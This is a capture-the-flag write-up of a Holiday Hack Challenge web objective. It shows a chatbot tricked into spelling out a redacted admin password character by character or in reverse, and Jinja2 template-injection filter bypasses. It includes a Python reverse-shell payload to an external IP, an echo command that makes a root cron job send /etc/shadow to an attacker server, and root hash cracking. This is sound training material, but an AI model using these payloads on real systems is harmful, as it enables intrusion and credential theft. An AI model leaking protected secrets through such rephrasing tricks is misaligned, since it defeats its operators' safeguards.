---
layout: default
title: act3_snowblindambush_mjd
nav: |
  <table>
  <thead>
  <tr>
  <th><a href="/HHC_2025/act3_free_ski_mjd.html">Previous Objective: Act3 Free Ski</a></th>
  <th><a href="/HHC_2025/index.html">Table of Contents</a></th>
  <th><a href="/HHC_2025/about_berrydunn.html">About BerryDunn</a></th>
  </tr>
  </thead>
  <tbody>
  </tbody>
  </table>
---
<table>
<thead>
<tr>
<th>Objective: Snowblind Ambush</th>
<th>Difficulty Level: 5</th>
</tr>
</thead>
<tbody>
<tr>
<td>Head to the Hotel to stop Frosty's plan. Torkel is waiting at the Grand Web Terminal.</td>
<td>Location: Grand Hotel</td>
</tr>
</tbody>
</table>
<p>
<h2>Solution Overview</h2>
</p>
<p>
Starting with only public access to the web application, reconnaisance was conducted to identify weaknesses. The chatbot was exploited to recover the admin password to the website. Once logged in, a file upload mechanism was discovered that allowed for abuse. The redirect after file upload used a parameter, that allowed Server Side Template Injection (SSTI). This was exploited to achieve Remote Code Execution (RCE) and access to the application as the www-data identity. A scheduled job was discovered that ran in the context of the root user. Under specific conditions this job would exfiltrate an encrypted copy of the /etc/shadow file. From this file, the password for the root user was obtained. This was used to elevate permissions and obtain the flag.
<br>
</p>
<table>
<thead>
<tr>
<th>Activity</th>
<th>Primary Tactic</th>
<th>MITRE ATT&CK Technique ID</th>
<th>MITRE ATT&CK Technique Name</th>
</tr>
</thead>
<tbody>
<tr>
<td>Gain Access to web application: Leak Sensitive Information</td>
<td>Reconnaissance</td>
<td>T1589</td>
<td>Gather Victim Identity Information</td>
</tr>
<tr>
<td>Explore SSTI and achieve RCE: Insecure Software</td>
<td>Execution</td>
<td>T1190</td>
<td>Exploit Public-Facing Application</td>
</tr>
<tr>
<td>Achieve Shell Access: Insecure File Upload	Resource</td>
<td>Development</td>
<td>T1608.001</td>
<td>Upload Malware</td>
</tr>
<tr>
<td>Exfiltrate Data</td>
<td>Exfiltration</td>
<td>T1041</td>
<td>Exfiltration Over C2 Channel</td>
</tr>
<tr>
<td>Decode PNG file</td>
<td>Defense Evasion</td>
<td>T1140</td>
<td>Deobfuscate/Decode Files or Information</td>
</tr>
<tr>
<td>Crack hashed password for Root</td>
<td>Credential Access</td>
<td>T1110.002</td>
<td>Password Cracking</td>
</tr>
<tr>
<td>Escalate Privileges</td>
<td>Privilege Escalation</td>
<td>T1548</td>
<td>Abuse Elevation Control Mechanism</td>
</tr>
</tbody>
</table>
<p>
<h2>Detailed Solution</h2>
</p>
<details>
<summary>Click to expand</summary>
<p>
<h2>Step One: Gain Access to web application by abusing Chatbot</h2>
<br>
</p>
<p>
Initial discovery activities of the website uncovered the following:
<br>
</p>
<ul>
<li>The landing page code included a javascript file that was not actually loaded, egg.js</li>
</ul>
<p>
    <img src="/HHC_2025/images/snowblind_egg.js.jpg" alt="Landing Page Code">
<br>
</p>
<ul>
<li>Reviewing the code gives a hint: "AI Gnomes do not know the difference between left and right"</li>
</ul>
<p>
    <img src="/HHC_2025/images/snowblind_egghint.jpg" alt="Chatbot Script Hint">
<br>
</p>
<ul>
<li>AI chatbot gives redacted and conflicting hints about the password for the application login</li>
</ul>
<p>
   Conversations with the chatbot revealed that it had information about the application admin account in the form of hints. Some of the hints are conflicting, making them unreliable. The chatbot redacts phrases, so it knows the password. The chatbot reveals the information when prompted to spell the password one character per line, defeating the redaction mechanisms. The password works for login, and additional functionality is available to explore. The left and right hint works as well. The chatbot will spell the password in reverse order without redactions.
<br>
</p>
<p>
   <strong>admin password: an_elf_and_password_on_a_bird</strong>
<br>
</p>
<p>
<img src="/HHC_2025/images/snowblind_adminpassword.jpg" alt="Admin Password">
<br>
</p>
<ul>
<li>File upload mechanism</li>
</ul>
<p>
    The profile page contains a file upload mechanism. While the page indicates only allowed filetypes, it is possible to upload a file that contains script code. Upon upload, the file is renamed to admin_XXXXXXXXXXXXXXXX.png, with the placeholder changing with every upload. This is a way to get a payload into the application, but not a way to trigger it.
<br>
</p>
<p>
    <img src="/HHC_2025/images/snowblind_fileupload.jpg" alt="File Upload">
<br>
</p>
<ul>
<li>Parameter used after file upload</li>
</ul>
<p>
  After upload the page redirects and uses a parameter username.
<br>
</p>
<p>
      <img src="/HHC_2025/images/snowblind_parameter.jpg" alt="Redirect Parameter">
<br>
</p>
<p>
<h2>Step Two: Explore SSTI and achieve RCE : Insecure Software</h2>
<br>
The hint indicates that the application is using Flask. There are two helpful resources for understanding SSTI:
<br>
</p>
<p>
<a href="https://onsecurity.io/article/server-side-template-injection-with-jinja2/">Server Side Template Injections with Jinja2</a>
<br>
</p>
<p>
<a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Python/#summary">Server Side Template Injection - Python - Payloads All The Things</a>
<br>
</p>
<p>
A basic test to see if SSTI is possible is {{7*7}}. Because the application evaluates the expression and displays the results on the page, the application is likely vulnerable.
<br>
</p>
<p>
<img src="/HHC_2025/images/snowblind_sstitest.jpg" alt="SSTI Test">
<br>
</p>
<p>
Trial and error testing revealed the following filters and the obfuscations needed to bypass.
<br>
</p>
<pre><code class="language-">
┌───────────────────────────────┐
│ 1. Payload Construction        │
│   - Bracket access             │
│   - Escaped underscores (\u005f, \137)
│   - Reversed strings ('ssalc'|reverse) │
└───────────────┬───────────────┘
                │
                ▼
┌───────────────────────────────┐
│ 2. WAF Bypass                 │
│   - Literal "_" stripped       │
│   - Escapes reconstruct "_"    │
│   - Reverse evades keyword ban │
└───────────────┬───────────────┘
                │
                ▼
┌───────────────────────────────┐
│ 3. Dunder Reconstruction      │
│   - __class__ rebuilt          │
│   - __mro__ rebuilt            │
└───────────────┬───────────────┘
                │
                ▼
┌───────────────────────────────┐
│ 4. Traversal into Internals   │
│   - attr('__subclasses__')()  │
│   - Returns real class list    │
└───────────────┬───────────────┘
                │
                ▼
┌───────────────────────────────┐
│ 5. Subclass Enumeration       │
│   - collections.OrderedDict    │
│   - enum._EnumDict             │
│   - werkzeug.datastructures... │
│   - flask.config.Config        │
│   ...                          │
└───────────────┬───────────────┘
                │
                ▼
┌───────────────────────────────┐
│ 6. Patched Routes             │
│   - object.__subclasses__() → 500
│   - mro()[0].__subclasses__() → 500
│   → Sandbox hardening present  │
└───────────────────────────────┘
</code></pre>
<p>
A script was used to enumerate the indexes and evaluate if RCE is possible. The initial command used was a simple 'whoami".
<br>
</p>
<p>
The enumeration script source code is located here: <a href="/HHC_2025/resources/snowblind_enumeration2.py.txt">Jinja2 SSTI Enumeration Script</a>
<br>
</p>
<p>
<img src="/HHC_2025/images/snowblind_enumeration1.jpg" alt="SSTI Enumeration">
<br>
</p>
<p>
The following indexes where discovered that would allow RCE:
<br>
</p>
<p>
<img src="/HHC_2025/images/snowblind_enumeration2.jpg" alt="SSTI Enumeration">
<br>
</p>
<p>
<h2>Step Three: Achieve Shell Access Utilizing Insecure File Upload</h2>
<br>
</p>
<p>
The following payload was inserted into a file called payload.jpg and uploaded to the admin profile.
<br>
</p>
<pre><code class="language-">
#!/bin/sh
export RHOST="45.79.190.29";export RPORT=4444;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
</code></pre>
<p>
Selecting index 205 with get > os > popen.read() as our target, the following command was executed, resulting in a shell running in the www-data context.
<br>
</p>
<pre><code class="language-">
sh /app/static/images/admin\\u005ff1f9cc53781abb79\\u002epng
</code></pre>
<p>
<h2>Step Four: Exfilitrate Data leveraging an Insecure processes / Data Leakage</h2>
<br>
</p>
<p>
With initial access established, time for more recon. An interesting cron job was located in /etc/cron/cron.d/mycron. It runs a backup script every minute as root.
<br>
</p>
<p>
<img src="/HHC_2025/images/snowblind_cronjob.jpg" alt="Cron Job">
<br>
</p>
<p>
The script does the following:
<br>
</p>
<ul>
<li>it looks for a file in /dev/shm with a name formatted according to this pattern: '\\.frosty[0-9]+$'</li>
<li>it reads the file and applies a regular expression that requires at least the final two characters of the url to be letters and not numbers</li>
<li>if the regular experssion is true, it encrypts a copy of /etc/shadow and posts it to the url</li>
</ul>
<p>
<img src="/HHC_2025/images/snowblind_regex.jpg" alt="URL Regex">
<br>
</p>
<p>
A copy of the backup script is located here: <a href="/HHC_2025/resources/snowblind_backup.py.txt">Backup Script</a>
<br>
</p>
<p>
An HTTP server was started on an external facing linux server on port 8000 to receive the data being exfitrated.
<br>
</p>
<p>
The following command was issued in the shell as www-data to trigger the data exfiltration. The file was created, and moments later it was deposited on my web server.
<br>
</p>
<pre><code class="language-">
echo "http://45-79-190-29.ip.linodeusercontent.com:8000/exfil" > /dev/shm/.frosty999
</code></pre>
<p>
The exfiltrated data file is located here: <a href="/HHC_2025/resources/shadow_exfil.png">Exfiltrated File</a>
<br>
</p>
<p>
<h2>Step Five:  Decode PNG file</h2>
<br>
</p>
<p>
Since we have the backup script, we know the encryption mechanism. We also know what the first block of data encrypted is "root:$". With this information, we can decode the file.
<br>
</p>
<p>
Using this script to decode: <a href="/HHC_2025/resources/snowblind_decodepng3.py.txt">PNG Decoder Script</a>
<br>
</p>
<p>
The file was damaged or incomplete, so the script suppresses errors and forces the data to be extracted. The backup script indicates that the data is exfiltrated is stored in the Blue channel of the file. The other channels can be ignored. Running the script reveals the exfiltrated data stored in the file.
<br>
</p>
<p>
<img src="/HHC_2025/images/snowblind_decodedpng.jpg" alt="Decoded PNG File">
<br>
</p>
<p>
<h2>Step Six: Crack Hash for Root</h2>
<br>
</p>
<p>
With the password hash, salt, and the algorithm used, we can attempt to crack the hash using John the Ripper and the rockyou word list.
<br>
</p>
<p>
<img src="/HHC_2025/images/snowblind_johntheripper.jpg" alt="John the Ripper">
<br>
</p>
<p>
<strong>root password: jollyboy</strong>
<br>
</p>
<p>
<h2>Step Seven: Escalate privileges</h2>
<br>
</p>
<p>
With root password, it is a simple matter to escalate privileges using the su command. Once root, there is a bash script in the /root directory. Executing the script reveals the flag.
<br>
</p>
<p>
<img src="/HHC_2025/images/snowblind_privilegeescalation.jpg" alt="Privilege Escalation">
<br>
</p>
<p>
<strong>Answer: hhc25{Frostify_The_World_c05730b46d0f30c9d068343e9d036f80}</strong>
<br>
</p>
</details>
<p>
<h2>Tools Reference</h2>
</p>
<table>
<thead>
<tr>
<th>Tools Used</th>
<th>Tool Version</th>
</tr>
</thead>
<tbody>
<tr>
<td>John the Ripper</td>
<td>1.9.0-jumbo-1+bleeding-aec1328d6c</td>
</tr>
<tr>
<td>Linux Linode</td>
<td>System	Ubuntu 24.04 LTS</td>
</tr>
<tr>
<td>netcat</td>
<td>v1.10-50</td>
</tr>
<tr>
<td>Edge Developer Tools</td>
<td>Version 142.0.3595.94</td>
</tr>
<tr>
<td>Burp Suite Community Edition</td>
<td>v2024.11.2</td>
</tr>
<tr>
<td>bash</td>
<td>v5.2.37(1)-release</td>
</tr>
<tr>
<td>python</td>
<td>v3.12.8</td>
</tr>
</tbody>
</table>
<p>
<h2>Hints Reference</h2>
</p>
<table>
<thead>
<tr>
<th>Provided By</th>
<th>Hint</th>
</tr>
</thead>
<tbody>
<tr>
<td>Santa</td>
<td>Codes: If you can't get your payload to work, perhaps you are missing some form of obfuscation? A computer can understand many languages and formats, find one that works! Don't give up until you have tried at least eight different ones, if not, then it's truely hopeless.</td>
</tr>
<tr>
<td>Santa</td>
<td>Overtly Helpful?: I think admin is having trouble, remembering his password. I wonder how he is retaining access, I'm sure someone or something is helping him remembering. Ask around!</td>
</tr>
<tr>
<td>Torkel</td>
<td>I've been studying this web application that controls part of Frosty's infrastructure. There's a Flask backend with an AI chatbot that seems to have access to sensitive system information. Think of this as finding a way up the skorstein into Frosty's system - we need to exploit this chatbot to gain access and ultimately stop Frosty from freezing everything. Can you help me get through these defenses?</td>
</tr>
</tbody>
</table>
<p>
<h2>Acknowledgements</h2>
</p>
<table>
<thead>
<tr>
<th>Provided By</th>
<th>Notes</th>
</tr>
</thead>
<tbody>
<tr>
<td>Fluffme</td>
<td>My initial "shell" was more of a SSTI command pipeline. This was not the right approach.</td>
</tr>
<tr>
<td>Khesperus</td>
<td>Sanity checks on achieving shell and on decrypting the png file.</td>
</tr>
</tbody>
</table>
